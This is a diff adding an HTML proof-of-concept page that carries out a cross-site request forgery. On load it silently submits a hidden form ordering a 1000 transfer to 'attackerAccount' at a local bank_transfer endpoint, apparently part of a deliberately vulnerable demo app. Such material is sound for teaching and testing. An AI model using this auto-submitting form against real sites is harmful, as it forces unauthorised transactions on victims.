@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Attack Page</title>
+</head>
+<body>
+    <h1>Attacker's Page</h1>
+    <p>This page attempts to perform a CSRF attack by submitting a form automatically.</p>
+
+    <script>
+        window.onload = function() {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:5000/csrf/bank_transfer';
+
+            var amount = document.createElement('input');
+            amount.type = 'hidden';
+            amount.name = 'amount';
+            amount.value = '1000';
+
+            var recipient = document.createElement('input');
+            recipient.type = 'hidden';
+            recipient.name = 'recipient';
+            recipient.value = 'attackerAccount';
+
+            form.appendChild(amount);
+            form.appendChild(recipient);
+            document.body.appendChild(form);
+
+            form.submit();
+        };
+    </script>
+
+    <noscript>
+        <form method="POST" action="http://localhost:5000/csrf/bank_transfer">
+            <input type="hidden" name="amount" value="1000">
+            <input type="hidden" name="recipient" value="attackerAccount">
+            <button type="submit">Perform CSRF Attack</button>
+        </form>
+    </noscript>
+</body>
+</html>
